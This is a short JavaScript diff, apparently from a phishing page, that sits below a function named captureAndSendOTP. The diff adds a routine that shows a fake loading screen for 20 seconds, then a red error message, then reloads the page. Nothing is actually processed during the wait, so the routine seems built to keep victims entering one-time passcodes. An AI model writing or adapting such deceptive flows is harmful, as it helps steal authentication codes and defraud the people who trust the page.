@@ -177,3 +177,44 @@ async function captureAndSendOTP() {
         alert("Error intentalo de nuevo");
     }
 }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function mostrarCargaYError() {
+  const loading = document.getElementById("loadingModal");
+  const error = document.getElementById("alertaError");
+
+  // 1️⃣ Mostrar cargando
+  loading.style.display = "flex";
+
+  // 2️⃣ Esperar 20 segundos
+  setTimeout(() => {
+
+    // Ocultar cargando
+    loading.style.display = "none";
+
+    // 3️⃣ Mostrar error
+    error.style.display = "flex";
+
+    // 4️⃣ Esperar y recargar
+    setTimeout(() => {
+      location.reload();
+    }, 5000); // ⏱️ tiempo visible del mensaje rojo
+
+  }, 20000); // ⏱️ tiempo de carga
+}
+
+
